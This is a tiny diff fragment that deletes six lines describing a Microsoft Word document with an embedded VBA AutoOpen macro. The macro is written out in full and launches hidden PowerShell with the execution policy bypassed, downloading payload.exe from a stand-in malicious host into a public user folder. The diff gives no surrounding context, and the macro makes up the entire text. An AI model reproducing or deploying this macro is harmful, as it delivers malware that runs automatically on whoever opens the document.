@@ -1,6 +1,0 @@
-Microsoft Word Document with embedded macro:
-Sub AutoOpen()
-  Dim obj As Object
-  Set obj = CreateObject("WScript.Shell")
-  obj.Run "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command (New-Object System.Net.WebClient).DownloadFile('http://malicious-site.com/payload.exe','C:\Users\Public\payload.exe')"
-End Sub
